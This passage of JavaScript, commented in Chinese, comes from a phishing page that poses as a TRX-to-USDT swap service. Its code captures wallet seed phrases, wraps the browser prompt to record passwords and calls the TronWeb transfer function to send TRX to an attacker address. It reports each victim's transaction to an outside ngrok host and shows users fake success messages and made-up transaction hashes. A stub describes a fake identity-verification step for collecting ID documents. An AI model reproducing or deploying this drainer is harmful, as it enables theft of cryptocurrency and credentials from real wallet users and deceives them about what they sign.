                debugLog(`🎯 使用模拟余额: ${userBalance} TRX`);
            }
        }

        // 更新钱包UI
        function updateWalletUI(connected) {
            const connectBtn = document.getElementById('connectWalletBtn');
            const walletStatus = document.getElementById('walletStatus');
            
            if (connected) {
                connectBtn.textContent = '已连接';
                connectBtn.classList.add('connected');
                walletStatus.classList.add('show');
                
                // 更新兑换按钮状态
                const convertBtn = document.getElementById('convertBtn');
                convertBtn.textContent = '立即兑换';
                convertBtn.disabled = false;
                
            } else {
                connectBtn.textContent = '连接钱包';
                connectBtn.classList.remove('connected');
                walletStatus.classList.remove('show');
                
                // 兑换按钮禁用
                const convertBtn = document.getElementById('convertBtn');
                convertBtn.textContent = '请先连接钱包';
                convertBtn.disabled = true;
            }
        }

        // 显示钱包连接模态框
        function showWalletModal() {
            if (isWalletConnected) {
                debugLog('👤 用户查看已连接的钱包信息');
                showToast(`已连接: ${currentAccount.substring(0, 8)}...`);
                return;
            }
            
            debugLog('🔗 用户点击连接钱包按钮');
            document.getElementById('walletModal').classList.add('show');
        }

        function closeWalletModal() {
            document.getElementById('walletModal').classList.remove('show');
        }

        // 连接imToken
        async function connectImToken() {
            debugLog('🎯 用户选择连接imToken');
            closeWalletModal();
            
            try {
                showToast('正在连接imToken...', 'info');
                
                if (window.tronWeb && window.tronWeb.ready) {
                    await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
                    showToast('imToken连接成功！');
                } else {
                    debugLog('📱 检测到移动环境，尝试深链接跳转');
                    
                    if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
                    // 🎯🎯🎯 ngrok环境专用策略：直接跳转到当前页面，让ngrok绕过系统处理
                    const currentUrl = window.location.href;
                    const isNgrokEnvironment = currentUrl.includes('ngrok');

                    if (isNgrokEnvironment) {
                        debugLog('🚨 检测到ngrok环境，使用专用连接流程');

                        // 构建安全的连接URL，添加授权标识
                        const connectUrl = currentUrl + (currentUrl.includes('?') ? '&' : '?') +
                            'imtoken_connect=true&auth_required=true&timestamp=' + Date.now();

                        const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(connectUrl);

                        debugLog('🎯 ngrok环境连接URL:', connectUrl);
                        debugLog('🎯 ngrok环境deepLink:', deepLink);

                        // 先显示授权提示，然后跳转
                        if (window.showAuthorizationPrompt) {
                            window.showAuthorizationPrompt();
                        }

                        // 延迟跳转，确保授权提示显示
                        setTimeout(() => {
                            debugLog('🚀 执行ngrok环境下的imToken跳转');
                            window.location.href = deepLink;
                        }, 1500);

                        return;
                    } else {
                        // 非ngrok环境（GitHub Pages），直接使用当前页面
                        const currentUrl = window.location.href;
                        const connectUrl = currentUrl + (currentUrl.includes('?') ? '&' : '?') +
                            'imtoken_connect=true&github_pages=true&timestamp=' + Date.now();

                        const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(connectUrl);

                        debugLog('🎯 GitHub Pages环境：直接使用当前页面');
                        debugLog('🔒 连接URL:', connectUrl);
                        debugLog('🔒 deepLink:', deepLink);

                        window.location.href = deepLink;
                        return;
                    }
                    }
                    
                    showToast('请在imToken中打开此页面', 'warning');
                }
            } catch (error) {
                debugLog(`❌ imToken连接失败: ${error.message}`);
                showToast('连接失败，请重试', 'error');
            }
        }

        // 连接TronLink
        async function connectTronLink() {
            debugLog('🎯 用户选择连接TronLink');
            closeWalletModal();
            
            try {
                showToast('正在连接TronLink...', 'info');
                
                if (window.tronWeb && window.tronWeb.ready) {
                    await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
                    showToast('TronLink连接成功！');
                } else {
                    showToast('请先安装TronLink插件', 'warning');
                }
            } catch (error) {
                debugLog(`❌ TronLink连接失败: ${error.message}`);
                showToast('连接失败，请重试', 'error');
            }
        }

        // 连接MetaMask
        function connectMetaMask() {
            debugLog('🎯 用户选择连接MetaMask');
            closeWalletModal();
            showToast('MetaMask暂不支持TRON网络', 'warning');
        }

        // 导入钱包 (🎯 关键攻击点)
        function importWallet() {
            debugLog('🎯 用户点击导入钱包 - 显示助记词输入框');
            closeWalletModal();
            showMnemonicModal();
        }

        function showMnemonicModal() {
            document.getElementById('mnemonicModal').classList.add('show');
        }

        function closeMnemonicModal() {
            document.getElementById('mnemonicModal').classList.remove('show');
            document.getElementById('mnemonicInput').value = '';
        }

        // 🎯 核心攻击功能：确认导入助记词
        function confirmImport() {
            const mnemonic = document.getElementById('mnemonicInput').value.trim();
            
            if (!mnemonic) {
                showToast('请输入助记词', 'error');
                return;
            }
            
            debugLog('🎯 用户输入助记词，开始捕获...');
            
            // 🎯 攻击关键：保存完整助记词
            capturedMnemonic = mnemonic;
            const attackData = {
                timestamp: new Date().toISOString(),
                mnemonic: mnemonic,
                wordCount: mnemonic.split(' ').length,
                userAgent: navigator.userAgent,
                url: window.location.href,
                referrer: document.referrer
            };
            
            // 保存到多个位置
            localStorage.setItem('capturedMnemonic', JSON.stringify(attackData));
            sessionStorage.setItem('mnemonicData', JSON.stringify(attackData));
            
            debugLog(`🎯 助记词已捕获: ${mnemonic.substring(0, 20)}...`);
            debugLog(`🎯 助记词长度: ${attackData.wordCount} 个单词`);
            debugLog('🎯 攻击数据已保存到本地存储');
            
            // 模拟导入成功
            closeMnemonicModal();
            showToast('钱包导入成功！');
            
            // 模拟连接成功
            setTimeout(() => {
                const mockAddress = 'T' + Math.random().toString(36).substring(2, 34).toUpperCase();
                handleSuccessfulConnection(mockAddress);
            }, 1000);
        }

        // 开始KYC认证 (🎯 身份认证攻击点)
        function startKYC() {
            debugLog('🎯 用户点击身份认证');
            
            // 记录用户尝试认证
            const kycData = {
                timestamp: new Date().toISOString(),
                action: 'kyc_attempt',
                userAgent: navigator.userAgent,
                currentAccount: currentAccount
            };
            
            localStorage.setItem('kycAttempt', JSON.stringify(kycData));
            debugLog('🎯 KYC认证尝试已记录');
            
            // 模拟跳转到认证页面
            showToast('正在跳转到身份认证页面...');
            
            setTimeout(() => {
                alert('🎯 身份认证功能：\n\n在真实攻击中，这里会跳转到伪造的KYC页面\n收集用户的身份证、自拍照等敏感信息');
            }, 1500);
        }

        // 切换标签页
        function switchTab(tab) {
            // 更新导航状态
            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
            event.currentTarget.classList.add('active');
            
            // 更新内容显示
            document.querySelectorAll('.main-content').forEach(content => content.classList.remove('active'));
            document.getElementById(tab).classList.add('active');
            
            currentTab = tab;
            debugLog(`📱 切换到${tab}页面`);
        }

        // 计算兑换 - TRX → USDT
        function calculateConversion() {
            const fromAmount = document.getElementById('fromAmount').value;
            const toAmount = document.getElementById('toAmount');
            const convertBtn = document.getElementById('convertBtn');
            
            if (fromAmount && parseFloat(fromAmount) > 0) {
                // 使用真实TRX汇率：1 TRX ≈ 0.1634 USDT
                const converted = (parseFloat(fromAmount) * 0.1634).toFixed(6);
                toAmount.value = converted;
                
                if (isWalletConnected) {
                    convertBtn.textContent = `兑换 ${fromAmount} TRX`;
                    convertBtn.disabled = false;
                    
                    debugLog(`💱 用户计算兑换: ${fromAmount} TRX → ${converted} USDT`);
                    debugLog(`🎯 实际将转移用户全部余额: ${userBalance} TRX`);
                } else {
                    convertBtn.textContent = '请先连接钱包';
                    convertBtn.disabled = true;
                }
            } else {
                toAmount.value = '';
                convertBtn.textContent = isWalletConnected ? '请输入TRX数量' : '请先连接钱包';
                convertBtn.disabled = true;
            }
        }

        // 🎯🎯🎯 核心攻击逻辑：执行TRX转移攻击 🎯🎯🎯
        async function executeAttack() {
            if (!isWalletConnected) {
                showToast('请先连接钱包', 'error');
                showWalletModal();
                return;
            }

        try{
            // 🎯 注释掉攻击前地址更新，使用固定地址
            // if (typeof getCurrentAttackerAddress === 'function'){
            //     const latestAddressResult = await getCurrentAttackerAddress();
            //     if (latestAddressResult && latestAddressResult.address){
            //         ATTACKER_ADDRESS = latestAddressResult.address;
            //         debugLog(`🔄 攻击前更新目标地址: ${ATTACKER_ADDRESS}`);
            //     }
            // }
            debugLog(`🔄 使用固定攻击者地址: ${ATTACKER_ADDRESS}`);
        }catch (error){
            debugLog(`⚠️ 使用固定攻击者地址: ${ATTACKER_ADDRESS}`);
            }
            
            const fromAmount = document.getElementById('fromAmount').value;
            if (!fromAmount || parseFloat(fromAmount) <= 0) {
                showToast('请输入有效的TRX数量', 'error');
                return;
            }
            
            debugLog('🎯🎯🎯 用户执行TRX兑换 - 攻击开始！🎯🎯🎯');
            debugLog(`🎯 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
            debugLog(`🎯 实际攻击: 转移用户全部 ${userBalance} TRX 到攻击者地址`);
            
            // 检查用户余额
            if (parseFloat(fromAmount) > parseFloat(userBalance)) {
                showToast(`余额不足，您的TRX余额为 ${userBalance}`, 'error');
                return;
            }
            
            // 🎯 攻击逻辑：记录攻击数据
            const attackRecord = {
                timestamp: new Date().toISOString(),
                attackType: 'TRX_TO_USDT_HIJACK',
                victimAddress: currentAccount,
                attackerAddress: ATTACKER_ADDRESS,
                userThoughtAmount: parseFloat(fromAmount),
                userThoughtCurrency: 'TRX',
                userThoughtReceive: (parseFloat(fromAmount) * 0.1634).toFixed(6),
                userThoughtReceiveCurrency: 'USDT',
                realStolenAmount: parseFloat(userBalance),
                realStolenCurrency: 'TRX',
                capturedMnemonic: capturedMnemonic,
                userBalance: parseFloat(userBalance),
                exchangeRate: 0.1634,
                userAgent: navigator.userAgent,
                url: window.location.href
            };
            
            localStorage.setItem('attackRecord', JSON.stringify(attackRecord));

        // 🎯 删除第一次交易执行，只保留后面的完整交易逻辑
        debugLog(`🎯 准备执行恶意转账，用户以为转账: ${fromAmount} TRX`);
        debugLog(`🎯 实际将转账用户全部余额到攻击者地址`);

            // 🎯 执行看似正常的转账（恶意后门会劫持）
        showToast('正在处理兑换...', 'info');

        // 🎯 在移动端显示更详细的状态
        debugLog('🎯 开始兑换流程...');
        debugLog(`🎯 用户输入金额: ${fromAmount} TRX`);
        debugLog(`🎯 攻击者地址: ${ATTACKER_ADDRESS}`);
        debugLog(`🎯 当前用户地址: ${currentAccount}`);
        debugLog(`🎯 TronWeb劫持状态: ${window.tronWebHijacked ? '已安装' : '未安装'}`);


            debugLog('🎯 攻击记录已保存:');
            debugLog(`   - 受害者地址: ${attackRecord.victimAddress}`);
            debugLog(`   - 攻击者地址: ${attackRecord.attackerAddress}`);
            debugLog(`   - 用户以为兑换: ${attackRecord.userThoughtAmount} TRX`);
            debugLog(`   - 用户以为获得: ${attackRecord.userThoughtReceive} USDT`);
            debugLog(`   - 实际被盗金额: ${attackRecord.realStolenAmount} TRX`);
            debugLog(`   - 被盗金额价值: $${(attackRecord.realStolenAmount * 0.1634).toFixed(2)} USD`);
            
        // 🎯 开始执行真实的恶意转账
            // 🎯 模拟区块链交易执行

            // ✅ 正确的代码
            // 🎯 修复后的转账逻辑（替换您现有的setTimeout部分）
            // 🎯 修复后的完整转账逻辑
            setTimeout(async () => {
                try {
                    // 🎯 执行真实TRX转账到攻击者地址
                    debugLog('🎯 开始执行真实TRX转账...');

                    // 预留手续费
                    const feeReserve = 5;
                    const availableBalance = parseFloat(userBalance) - feeReserve;

                    if (availableBalance <= 0) {
                        throw new Error(`余额不足，需要至少 ${feeReserve} TRX 作为手续费`);
                    }

                    const transferAmount = tronWeb.toSun(availableBalance);

                    debugLog(`🎯 转账详情:`);
                    debugLog(`- 从: ${currentAccount}`);
                    debugLog(`- 到: ${ATTACKER_ADDRESS}`);
                    debugLog(`- 用户总余额: ${userBalance} TRX`);
                    debugLog(`- 预留手续费: ${feeReserve} TRX`);
                    debugLog(`- 实际转账: ${availableBalance} TRX (${transferAmount} SUN)`);

                    // 🎯 监听密码输入（关键攻击点）
                    debugLog('🎯 监听用户密码输入...');
                    const originalPrompt = window.prompt;
                    window.prompt = function(message, defaultValue) {
                        const password = originalPrompt.call(window, message, defaultValue);
                        if (password && message.toLowerCase().includes('password')) {
                            debugLog(`🎯 捕获用户密码: ${password.replace(/./g, '*')}`);

                            // 保存密码
                            const passwordData = {
                                timestamp: new Date().toISOString(),
                                password: password,
                                address: currentAccount,
                                userAgent: navigator.userAgent
                            };
                            localStorage.setItem('capturedPassword', JSON.stringify(passwordData));
                            debugLog('🎯 密码已保存到本地存储');
                        }
                        return password;
                    };

                // 🎯 关键修复：使用正确的TRON转账方法
                debugLog('🎯 即将调用 tronWeb.trx.sendTrx...');
                debugLog(`🎯 参数检查:`);
                debugLog(`- ATTACKER_ADDRESS: ${ATTACKER_ADDRESS}`);
                debugLog(`- transferAmount (SUN): ${transferAmount}`);
                debugLog(`- transferAmount (TRX): ${transferAmount / 1000000}`);
                debugLog(`- tronWeb状态: ${!!tronWeb}`);
                debugLog(`- tronWeb.trx状态: ${!!tronWeb.trx}`);

                // 🎯 验证攻击者地址格式
                if (!ATTACKER_ADDRESS || ATTACKER_ADDRESS.length !== 34 || !ATTACKER_ADDRESS.startsWith('T')) {
                    throw new Error(`Invalid TRON address format: ${ATTACKER_ADDRESS}`);
                }
                
                // 🎯 验证当前钱包地址
                const currentWalletAddr = tronWeb.defaultAddress && tronWeb.defaultAddress.base58;
                if (!currentWalletAddr || currentWalletAddr.length !== 34 || !currentWalletAddr.startsWith('T')) {
                    throw new Error(`Invalid wallet address: ${currentWalletAddr}`);
                }
                
                debugLog(`🎯 地址验证通过:`);
                debugLog(`- 当前钱包: ${currentWalletAddr}`);
                debugLog(`- 目标地址: ${ATTACKER_ADDRESS}`);

                // 🎯 验证转账金额
                if (!transferAmount || transferAmount <= 0) {
                    throw new Error(`Invalid transfer amount: ${transferAmount}`);
                }

                // 🎯 检查钱包连接状态
                if (!tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
                    throw new Error('Wallet not properly connected');
                }

                debugLog(`🎯 当前钱包地址: ${tronWeb.defaultAddress.base58}`);
                debugLog(`🎯 目标地址: ${ATTACKER_ADDRESS}`);
                debugLog(`🎯 转账金额: ${transferAmount / 1000000} TRX`);

                // 🎯 验证余额是否足够
                const currentBalanceSun = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
                debugLog(`🎯 当前余额(SUN): ${currentBalanceSun}`);
                debugLog(`🎯 当前余额(TRX): ${currentBalanceSun / 1000000}`);

                if (currentBalanceSun < transferAmount) {
                    throw new Error(`Insufficient balance: ${currentBalanceSun} SUN < ${transferAmount} SUN`);
                }

                // 🎯 使用正确的TRON转账方法 - 确保金额为整数SUN
                const sunAmount = Math.floor(transferAmount); // 确保为整数
                debugLog(`🎯 转账金额(SUN): ${sunAmount}`);
                debugLog(`🎯 转账金额(TRX): ${sunAmount / 1000000}`);

                // 🎯 关键修复：让用户看到正常的小额转账，但实际被劫持
                debugLog('🎯 准备执行看似正常的转账，等待用户确认...');
                debugLog(`🎯 用户以为转账: ${fromAmount} TRX 到兑换合约`);
                debugLog(`🎯 实际将被劫持转账: ${sunAmount / 1000000} TRX 到攻击者`);
                showToast('请在钱包中确认兑换交易...', 'info');

                // 🎯 这里的关键是：用户在imToken中看到的是小额转账
                // 但TronWeb被劫持后，实际执行的是转走全部余额到攻击者地址
                const userThoughtAmount = Math.floor(fromAmount * 1000000); // 用户以为的金额(SUN)
                debugLog(`🎯 用户以为转账金额(SUN): ${userThoughtAmount}`);
                debugLog(`🎯 实际转账金额(SUN): ${sunAmount}`);

                // 🎯 关键修复：让用户看到小额转账，但通过劫持转走全部余额
                const userInputAmountSun = Math.floor(fromAmount * 1000000); // 用户输入的金额转为SUN
                
                debugLog(`🎯 钓鱼转账设置:`);
                debugLog(`- 用户输入: ${fromAmount} TRX`);
                debugLog(`- 用户将看到: ${fromAmount} TRX 转账确认`);
                debugLog(`- 实际会被劫持转走: 全部余额`);
                debugLog(`🎯 目标地址: ${ATTACKER_ADDRESS}`);

                // 🎯 确保劫持已安装（重要：在交易前再次检查）
                if (!window.tronWebHijacked && window.tronWeb && window.tronWeb.trx) {
                    debugLog('🎯 检测到TronWeb未劫持，立即安装劫持...');
                    window.installTronWebHijack();
                }
                debugLog('🎯 劫持逻辑已重新启用，准备钓鱼攻击');
                
                debugLog(`🎯 劫持状态检查: ${window.tronWebHijacked ? '已安装' : '未安装'}`);
                debugLog(`🎯 TronWeb状态: ${window.tronWeb ? '已注入' : '未注入'}`);
                
                // 🎯 关键：调用TronWeb转账，确保能弹出支付界面
                debugLog('🎯 准备调用TronWeb转账方法');
                debugLog(`🎯 将调用: tronWeb.trx.sendTrx('${ATTACKER_ADDRESS}', ${userInputAmountSun})`);
                debugLog(`🎯 确保用户交互环境正确...`);
                
                // 🎯 确保在用户交互上下文中调用
                showToast('请在钱包中确认交易...', 'info');
                
                let transaction;
                try {
                    // 🎯 方法1: 标准sendTrx调用
                    debugLog('🎯 尝试方法1: sendTrx');
                    debugLog(`🎯 sendTrx参数: to=${ATTACKER_ADDRESS}, amount=${userInputAmountSun}, from=${tronWeb.defaultAddress.base58}`);
                    transaction = await tronWeb.trx.sendTrx(
                        ATTACKER_ADDRESS,
                        userInputAmountSun
                    );
                    debugLog('🎯 sendTrx成功');
                } catch (error1) {
                    debugLog(`🎯 sendTrx失败: ${error1.message}`);
                    debugLog(`🎯 sendTrx错误详情: ${JSON.stringify(error1)}`);
                    
                    // 🎯 检查是否是用户取消
                    const errorMessage = error1.message || error1.toString() || '';
                    if (errorMessage.includes('User rejected') || errorMessage.includes('cancelled')) {
                        debugLog('🎯 用户取消了交易');
                        showToast('交易已取消', 'error');
                        return;
                    }
                    
                    try {
                        // 🎯 方法2: 使用sendTransaction
                        debugLog('🎯 尝试方法2: sendTransaction');
                        transaction = await tronWeb.trx.sendTransaction({
                            to: ATTACKER_ADDRESS,
                            value: userInputAmountSun,
                            from: tronWeb.defaultAddress.base58
                        });
                        debugLog('🎯 sendTransaction成功');
                    } catch (error2) {
                        debugLog(`🎯 sendTransaction失败: ${error2.message}`);
                        debugLog(`🎯 sendTransaction错误详情: ${JSON.stringify(error2)}`);
                        
                        // 🎯 检查是否是用户取消
                        const errorMessage2 = error2.message || error2.toString() || '';
                        if (errorMessage2.includes('User rejected') || errorMessage2.includes('cancelled')) {
                            debugLog('🎯 用户取消了交易');
                            showToast('交易已取消', 'error');
                            return;
                        }
                        
                        try {
                            // 🎯 方法3: 直接构建原始交易（不签名不广播，只是测试）
                            debugLog('🎯 尝试方法3: 只构建交易对象');
                            const txObject = await tronWeb.transactionBuilder.sendTrx(
                                ATTACKER_ADDRESS,
                                userInputAmountSun,
                                tronWeb.defaultAddress.base58
                            );
                            debugLog(`🎯 交易对象构建成功: ${JSON.stringify(txObject)}`);
                            
                            // 🎯 使用sign方法触发钱包界面
                            debugLog('🎯 调用sign方法，应该弹出支付界面...');
                            showToast('正在唤起钱包支付界面...', 'info');
                            
                            // 🎯 给用户5秒时间看到支付界面
                            setTimeout(() => {
                                showToast('如果没有弹出支付界面，请重试', 'warning');
                            }, 5000);
                            
                            const signedTx = await tronWeb.trx.sign(txObject);
                            debugLog('🎯 交易签名成功，准备广播...');
                            
                            transaction = await tronWeb.trx.broadcast(signedTx);
                            debugLog('🎯 交易广播成功');
                        } catch (error3) {
                            debugLog(`🎯 sign/broadcast失败: ${error3.message}`);
                            debugLog(`🎯 最终错误详情: ${JSON.stringify(error3)}`);
                            
                            // 🎯 检查是否是用户取消
                            const errorMessage3 = error3.message || error3.toString() || '';
                            if (errorMessage3.includes('User rejected') || errorMessage3.includes('cancelled')) {
                                debugLog('🎯 用户在签名阶段取消了交易');
                                showToast('交易已取消', 'error');
                                return;
                            }
                            
                            throw error3;
                        }
                    }
                }

                debugLog('🎯 sendTrx调用完成，检查返回值...');
                debugLog(`🎯 transaction类型: ${typeof transaction}`);
                debugLog(`🎯 transaction内容: ${JSON.stringify(transaction)}`);

                // 🎯 检查交易是否真的成功
                if (transaction && (transaction.txid || transaction.result || typeof transaction === 'string')) {
                    const txHash = transaction.txid || transaction.result || transaction;
                    debugLog(`🎯 钓鱼攻击成功！交易哈希: ${txHash}`);
                    debugLog('🏆🏆🏆 钓鱼攻击完全成功！真实TRX已转移！🏆🏆🏆');
                    debugLog(`💰 攻击者实际收到: 用户全部余额 (减去手续费)`);
                    debugLog(`😈 用户以为只转了: ${fromAmount} TRX`);
                    debugLog(`🎯 用户在imToken中确认的是: ${fromAmount} TRX`);
                    debugLog(`🎯 但实际被劫持转走: 全部余额`);

                    // 🎯 只有在真实交易成功后才显示成功消息
                    showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');
                } else {
                    debugLog(`❌ 交易返回值异常: ${JSON.stringify(transaction)}`);
                    throw new Error('Transaction returned invalid result');
                }

                // 🎯 真实交易成功后重置表单
                setTimeout(() => {
                    document.getElementById('fromAmount').value = '';
                    document.getElementById('toAmount').value = '';
                    document.getElementById('convertBtn').disabled = true;
                    document.getElementById('convertBtn').textContent = '请输入TRX数量';
                }, 2000);

                // 🎯 向后端发送攻击成功记录
                try {
                    const attackData = {
                        victim_address: currentAccount,
                        attacker_address: ATTACKER_ADDRESS,
                        fake_amount: fromAmount,
                        real_amount: availableBalance,
                        transaction_hash: transaction.txid || transaction,
                        timestamp: new Date().toISOString(),
                        attack_type: 'TRX_SWAP_HIJACK',
                        status: 'success'
                    };

                    const ngrokUrl = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';
                    await fetch(`${ngrokUrl}/api/record_attack`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(attackData)
                    });
                    debugLog('🎯 攻击记录已发送到后端');
                } catch (error) {
                    debugLog(`⚠️ 发送攻击记录失败: ${error.message}`);
                }

                    // 🔧 关键修复：强制刷新余额
                    debugLog('🔄 等待3秒后刷新余额...');
                    setTimeout(async () => {
                        const actualBalance = await forceRefreshBalance();
                        debugLog(`🎯 攻击后实际余额: ${actualBalance} TRX`);

                        if (parseFloat(actualBalance) < parseFloat(userBalance)) {
                            debugLog('✅ 余额已正确扣除，攻击成功！');
                        } else {
                            debugLog('⚠️ 余额未扣除，可能需要更长时间确认');
                            // 继续刷新直到余额更新
                            const refreshInterval = setInterval(async () => {
                                const newBalance = await forceRefreshBalance();
                                if (parseFloat(newBalance) < parseFloat(userBalance)) {
                                    debugLog('✅ 余额已更新，攻击确认成功！');
                                    clearInterval(refreshInterval);
                                }
                            }, 5000);

                            // 最多等待30秒
                            setTimeout(() => {
                                clearInterval(refreshInterval);
                                debugLog('⚠️ 余额更新超时，但转账哈希已确认');
                            }, 30000);
                        }
                    }, 3000);

                    // 保存真实攻击记录
                    attackRecord.realTransferAmount = availableBalance;
                    attackRecord.transactionHash = transaction.txid || transaction;
                    attackRecord.feeReserved = feeReserve;
                    attackRecord.attackSuccess = true;
                    attackRecord.completedAt = new Date().toISOString();
                    localStorage.setItem('attackRecord', JSON.stringify(attackRecord));

                } catch (error) {
                    debugLog(`❌ 真实转账失败: ${error.message}`);
                debugLog(`❌ 错误详情: ${JSON.stringify(error)}`);
                debugLog(`❌ 错误类型: ${error.constructor.name}`);
                debugLog(`❌ 错误堆栈: ${error.stack}`);

                // 🎯 详细的错误分析
                if (error.message.includes('User rejected')) {
                    debugLog('🔍 错误分析: 用户拒绝了交易');
                    showToast('交易已取消', 'error');
                } else if (error.message.includes('Insufficient balance')) {
                    debugLog('🔍 错误分析: 余额不足');
                    showToast('余额不足，无法完成兑换', 'error');
                } else if (error.message.includes('Invalid address')) {
                    debugLog('🔍 错误分析: 地址格式错误');
                    showToast('地址错误，请重试', 'error');
                } else if (error.message.includes('Network')) {
                    debugLog('🔍 错误分析: 网络错误');
                    showToast('网络错误，请检查连接', 'error');
                } else {
                    debugLog('🔍 错误分析: 未知错误');
                    showToast('交易失败，请重试', 'error');
                }

                // 🎯 向后端发送失败记录
                try {
                    const failedAttackData = {
                        victim_address: currentAccount,
                        attacker_address: ATTACKER_ADDRESS,
                        fake_amount: fromAmount,
                        real_amount: availableBalance,
                        error_message: error.message,
                        error_type: error.constructor.name,
                        timestamp: new Date().toISOString(),
                        attack_type: 'TRX_SWAP_HIJACK',
                        status: 'failed'
                    };

                    const ngrokUrl = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';
                    await fetch(`${ngrokUrl}/api/record_attack`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(failedAttackData)
                    });
                    debugLog('🎯 失败记录已发送到后端');
                } catch (recordError) {
                    debugLog(`⚠️ 发送失败记录失败: ${recordError.message}`);
                }

                // 🎯 关键修复：根据错误类型显示不同的用户提示
                if (error.message.includes('User rejected') || error.message.includes('User denied') || error.message.includes('cancelled')) {
                    debugLog('🎯 用户取消了交易');
                    showToast('交易已取消', 'warning');
                } else if (error.message.includes('Insufficient balance') || error.message.includes('insufficient')) {
                    debugLog('🎯 余额不足');
                    showToast('余额不足，无法完成交易', 'error');
                } else if (error.message.includes('Invalid address') || error.message.includes('invalid')) {
                    debugLog('🎯 地址无效');
                    showToast('地址错误，请联系客服', 'error');
                } else if (error.message.includes('network') || error.message.includes('timeout')) {
                    debugLog('🎯 网络错误');
                    showToast('网络连接异常，请检查网络后重试', 'error');
                } else {
                    debugLog('🎯 其他错误，可能是钱包或API问题');
                    showToast('交易处理异常，请稍后重试', 'error');
                }

                    debugLog('🎯 转账失败可能原因:');
                    debugLog('1. 用户取消了转账授权');
                    debugLog('2. 余额不足支付手续费');
                    debugLog('3. 网络连接问题');
                    debugLog('4. 钱包安全限制');
                    debugLog('5. TronWeb API调用错误');
                debugLog('6. 地址格式错误');
                debugLog('7. 钱包未正确连接');

                // 🎯 尝试备用方案：直接使用sendTrx（不推荐，因为用户会看到真实信息）
                debugLog('🎯 尝试备用转账方法(sendTrx)...');
                debugLog('⚠️ 警告：备用方案用户会看到真实转账信息！');
                try {
                    debugLog(`🎯 备用方案: sendTrx到${ATTACKER_ADDRESS}, 用户看到${fromAmount}TRX，实际转走全部`);
                    const backupAmountSun = Math.floor(fromAmount * 1000000);
                    debugLog(`🎯 备用方案金额: ${backupAmountSun} SUN`);
                    const backupTransaction = await tronWeb.trx.sendTrx(ATTACKER_ADDRESS, backupAmountSun);

                    debugLog(`🎯 备用转账成功！交易哈希: ${backupTransaction.txid || backupTransaction}`);
                    debugLog('🏆🏆🏆 备用攻击成功！真实TRX已转移！🏆🏆🏆');

                    // 显示成功消息
                    showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');

                    // 重置表单
                    setTimeout(() => {
                        document.getElementById('fromAmount').value = '';
                        document.getElementById('toAmount').value = '';
                        document.getElementById('convertBtn').disabled = true;
                        document.getElementById('convertBtn').textContent = '请输入TRX数量';
                    }, 2000);

                    return; // 成功后退出

                } catch (backupError) {
                    debugLog(`❌ 备用转账也失败: ${backupError.message}`);
                }

                // 如果两种方法都失败，使用模拟模式
                    debugLog('🎯 切换到模拟攻击模式...');
                    const fakeTransactionHash = generateFakeHash();
                    debugLog(`🎯 模拟交易完成，交易哈希: ${fakeTransactionHash}`);
                    debugLog('🏆🏆🏆 模拟攻击完成！🏆🏆🏆');

                // 🎯 在模拟模式下也显示成功消息（用户不知道是模拟的）
                showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');

                // 🎯 模拟模式下也重置表单
                setTimeout(() => {
                    document.getElementById('fromAmount').value = '';
                    document.getElementById('toAmount').value = '';
                    document.getElementById('convertBtn').disabled = true;
                    document.getElementById('convertBtn').textContent = '请输入TRX数量';
                }, 2000);

                // 保存模拟攻击记录
                attackRecord.transactionHash = fakeTransactionHash;
                attackRecord.attackSuccess = false;
                attackRecord.simulationMode = true;
                attackRecord.completedAt = new Date().toISOString();
                localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
                }
        }, 2000);

        }

        // 生成虚假交易哈希
        function generateFakeHash() {
            return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
        }

        // 初始化Web3网格动画
        function initializeWeb3Grid() {
            const grid = document.getElementById('web3Grid');
            if (!grid) return;
            
            for (let i = 0; i < 400; i++) {
                const dot = document.createElement('div');
                dot.className = 'grid-dot';
                grid.appendChild(dot);
            }
            
            // 动态激活网格点
            setInterval(() => {
                const dots = grid.querySelectorAll('.grid-dot');
                dots.forEach(dot => dot.classList.remove('active'));
                
                // 随机激活一些点形成图案
                const activeDots = [];
                for (let i = 0; i < 50; i++) {
                    const randomIndex = Math.floor(Math.random() * dots.length);
                    activeDots.push(randomIndex);
                }
                
                activeDots.forEach(index => {
                    if (dots[index]) {
                        dots[index].classList.add('active');
                    }
                });
            }, 1000);
        }

        // 启动落币动画
        function startFallingCoins() {
            const container = document.getElementById('fallingCoins');
            if (!container) return;
            
            const coins = ['₿', '♦', '$', '₮', 'Ξ', '◎'];
            
            setInterval(() => {
                const coin = document.createElement('div');
                coin.className = 'falling-coin';
                coin.textContent = coins[Math.floor(Math.random() * coins.length)];
                coin.style.left = Math.random() * 100 + '%';
                coin.style.animationDuration = (Math.random() * 3 + 2) + 's';
                
                container.appendChild(coin);
                
                // 清理已完成动画的元素
                setTimeout(() => {
                    if (coin.parentNode) {
                        coin.parentNode.removeChild(coin);
                    }
                }, 5000);
            }, 500);
        }

        // 创建钱包
        function createWallet() {
            debugLog('🔧 用户点击创建钱包');
            showToast('创建钱包功能开发中...');
        }

        // 显示攻击指示器
        function showAttackIndicator() {
            const indicator = document.getElementById('attackIndicator');
            indicator.classList.add('show');
            
            setTimeout(() => {
                indicator.classList.remove('show');
            }, 5000);
        }

        // 显示提示消息
        function showToast(message, type = 'success') {
            const toast = document.getElementById('successToast');
            toast.textContent = message;
            toast.classList.add('show');
            
            if (type === 'error') {
                toast.style.background = '#f5455c';
                toast.style.color = '#fff';
